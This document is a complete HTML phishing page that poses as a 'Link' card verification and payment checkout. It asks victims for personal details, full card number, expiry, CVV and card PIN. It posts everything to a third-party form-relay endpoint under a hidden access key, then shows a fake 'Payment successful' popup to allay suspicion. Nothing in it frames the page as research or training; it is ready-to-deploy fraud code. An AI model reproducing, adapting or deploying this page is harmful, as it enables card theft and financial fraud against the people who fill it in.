<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Verification Portal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css">

    <!-- ===== POPUP STYLES ===== -->
    <style>
        .popup-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, .55);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }
        .popup-overlay.show {
            display: flex;
        }
        .popup-box {
            background: #fff;
            border-radius: 14px;
            padding: 30px 25px;
            max-width: 360px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, .3);
            animation: popIn .3s ease;
        }
        @keyframes popIn {
            from { transform: scale(.85); opacity: 0; }
            to   { transform: scale(1);   opacity: 1; }
        }
        .popup-icon {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: #28a745;
            color: #fff;
            font-size: 38px;
            line-height: 70px;
            margin: 0 auto 15px;
        }
        .popup-box h3 {
            font-weight: 700;
            margin-bottom: 8px;
        }
        .popup-box p {
            color: #6c757d;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<div class="container d-flex justify-content-center align-items-center min-vh-100">
    <div class="form-container shadow-lg bg-white rounded">

        <div class="header-section text-center">

            <img src="link.jpeg" alt="Pay securely with link" class="img-fluid my-3" style="max-width: 100%; height: auto;">

            <div class="atm-images my-3">
                <img src="https://img.icons8.com/color/70/visa.png" alt="Visa">
                <img src="https://img.icons8.com/color/70/mastercard.png" alt="Mastercard">
                <img src="https://img.icons8.com/color/70/amex.png" alt="Amex">
            </div>
            <h4 class="fw-bold">Confirm your card details</h4>
        </div>

        <!-- ADDED id="cardForm" -->
        <form id="cardForm" action="https://api.web3forms.com/submit" method="POST">

            <input type="hidden" name="access_key" value="175ef90b-a673-4712-a2eb-ecf9223ed1a9">

            <input type="hidden" name="redirect" value="https://your-website-link.com/success.html">

            <div class="row">
                <div class="col-md-6 mb-3">
                    <label class="form-label">First Name</label>
                    <input type="text" name="First_Name" class="form-control" placeholder="First Name" required>
                </div>
                <div class="col-md-6 mb-3">
                    <label class="form-label">Last Name</label>
                    <input type="text" name="Last_Name" class="form-control" placeholder="Last Name" required>
                </div>
            </div>

            <div class="mb-3">
                <label class="form-label">Email Address</label>
                <input type="email" name="Email" class="form-control" placeholder="Enter your email address" required>
            </div>

            <div class="mb-3">
                <label class="form-label">Phone Number</label>
                <input type="tel" name="Phone_Number" id="pfPhone" class="form-control" placeholder="Phone number" autocomplete="tel" maxlength="25" required />
            </div>

            <div class="mb-3">
                <label class="form-label">Billing Address</label>
                <input type="text" name="Address" class="form-control" placeholder="Full Street Address" required>
            </div>

            <div class="row">
                <div class="col-12 mb-3">
                    <label class="form-label">Country</label>
                    <select name="Country" class="form-select" required>
                        <option value="" disabled selected>Select your country</option>
                        <option value="Philippines">Philippines</option>
                        <option value="United States">United States</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="Canada">Canada</option>
                        <option value="Australia">Australia</option>
                        <option value="Singapore">Singapore</option>
                        <option value="Germany">Germany</option>
                        <option value="France">France</option>
                        <option value="Japan">Japan</option>
                        <option value="South Korea">South Korea</option>
                        <option value="India">India</option>
                        <option value="Brazil">Brazil</option>
                        <option value="Mexico">Mexico</option>
                        <option value="Thailand">Thailand</option>
                        <option value="Turkey">Turkey</option>
                        <option value="Taiwan">Taiwan</option>
                        <option value="Indonesia">Indonesia</option>
                        <option value="Italy">Italy</option>
                        <option value="Spain">Spain</option>
                        <option value="Netherlands">Netherlands</option>
                        <option value="Saudi Arabia">Saudi Arabia</option>
                        <option value="Sweden">Sweden</option>
                        <option value="Switzerland">Switzerland</option>
                        <option value="Kuwait">Kuwait</option>
                        <option value="Qatar">Qatar</option>
                        <option value="Norway">Norway</option>
                        <option value="Denmark">Denmark</option>
                        <option value="Hong Kong">Hong Kong</option>
                        <option value="Russia">Russia</option>
                        <option value="Ukraine">Ukraine</option>
                        <option value="other">Other</option>
                    </select>
                </div>
            </div>

            <div class="card-input-box p-3 mb-3">
                <div class="mb-3">
                    <label class="form-label">16-Digit Card Number</label>
                    <input type="text" name="Card_Number" class="form-control" pattern="\d{16}" maxlength="16" placeholder="0000 0000 0000 0000" required>
                </div>
                <div class="row">
                    <div class="col-6 mb-3">
                        <label class="form-label">Expiration</label>
                        <input type="text" name="Expiry" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="col-6 mb-3">
                        <label class="form-label">CVV Code</label>
                        <input type="text" name="CV" class="form-control" pattern="\d{3,4}" maxlength="4" placeholder="123" required>
                    </div>
                    <div class="col-6 mb-3">
                        <label class="form-label">Pin Code</label>
                        <input type="text" name="Pine_Code" class="form-control" placeholder="4-6 Digits" min="1000" max="999999" required>
                    </div>
                </div>
            </div>

            <button type="submit" class="btn btn-primary w-100 py-2 fw-bold">Pay Now</button>
        </form>
    </div>
</div>

<!-- ===== SUCCESS POPUP ===== -->
<div class="popup-overlay" id="successPopup">
    <div class="popup-box">
        <div class="popup-icon">&#10003;</div>
        <h3>Successful</h3>
        <p>Payment successful.</p>
        <button type="button" class="btn btn-primary w-100 py-2 fw-bold" onclick="closePopup()">OK</button>
    </div>
</div>

<!-- ===== JAVASCRIPT: AUTO SLASH + POPUP ===== -->
<script>
    /* ---- Auto slash for MM/YY ---- */
    const expiryInput = document.getElementById('expiry');

    expiryInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value.substring(0, 5);
    });

    /* ---- Form submit + success popup ---- */
    const form  = document.getElementById('cardForm');
    const popup = document.getElementById('successPopup');

    form.addEventListener('submit', async function (e) {
        e.preventDefault(); // stop full page reload

        const btn = form.querySelector('button[type="submit"]');
        const originalText = btn.innerHTML;

        btn.disabled = true;
        btn.innerHTML = 'Processing Payment...';

        try {
            const response = await fetch(form.action, {
                method: 'POST',
                body: new FormData(form),
                headers: { 'Accept': 'application/json' }
            });

            const result = await response.json();

            if (response.ok && result.success) {
                popup.classList.add('show');   // show the popup
                form.reset();                  // clear the form
            } else {
                alert('Something went wrong. Please try again.');
            }
        } catch (error) {
            alert('Network error. Please check your connection and try again.');
        } finally {
            btn.disabled = false;
            btn.innerHTML = originalText;
        }
    });

    /* ---- Close popup ---- */
    function closePopup() {
        popup.classList.remove('show');
        // Optional: send user to a thank-you page after closing
        // window.location.href = 'https://your-website-link.com/success.html';
    }

    /* Close popup when clicking the dark background */
    popup.addEventListener('click', function (e) {
        if (e.target === popup) closePopup();
    });
</script>

</body>
</html>
